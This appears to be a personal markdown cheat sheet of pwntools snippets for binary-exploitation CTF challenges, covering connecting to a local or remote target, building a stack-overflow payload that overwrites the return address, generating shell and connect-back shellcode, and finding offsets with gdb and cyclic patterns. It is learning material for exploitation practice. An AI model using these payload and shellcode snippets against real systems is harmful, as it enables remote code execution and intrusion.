# starting

```python
target = gdb.debug('./sleigh')
target = process("./sleigh")
target = remote("206.189.24.71",30384 )
```

# sending an receiving

```python
target.recvuntil(b">")
target.sendline(b"1")

target.sendafter('hello', payload)

rsp = target.recvuntil(b">")

target.interactive()
print(target.recvall())
```


# crafting payloads
```python
context.update(arch='amd64', os='linux')

shellcode = shellcraft.sh()
shellcode = shellcraft.connect("127.0.0.1", 9999, network='ipv4')

# packing the payload to bytes
payload = asm(shellcode)
```

# generating payload

```python
payload = b"\x41" * 64 + b"\x00" * 8
payload += new_buffer_packet
payload += asm(shellcode)
payload += b"\x00" * 8
```

# printing, converting and helpful commands

printing infos
```python
info("Getting address of vulenrable buffer...")
info("Vulnerable buffer address: %s" % rsp[64:78])
```

getting hex address out of string, convert it to int and make caluclations on it

```python
buffer_addr = rsp[64:78]
new_buff_addr = int(buffer_addr,16) + 0x50
```

and convert it back to shellcode (also swap endianes)
```python
new_buffer_packet = p64(new_buff_addr)
new_buffer_packet = p32(new_buff_addr) # if 64 or 32 depends on address size
```

printing bytes to hex string to use it in gdb

```python
payload = asm(shellcode)
pay = '\\x' + '\\x'.join('{:02x}'.format(x) for x in payload)
print(pay)
```

# attach gdb and run commands

[[../Dynamic Analyses/pwndbg]]

```python
gdb.attach(target,gdbscript='''
set follow-fork-mode child
continue
''')
```

# use coredump to find padding

```python
# cylic
g = cyclic_gen()
payload = g.get(200)


# sending and receiving stuff
target.sendafter('>', payload)

target.wait()
ip_offset = cyclic_find(target.corefile.read(target.corefile.sp, 4))  # x64
info('located EIP/RIP offset at {a}'.format(a=ip_offset))
```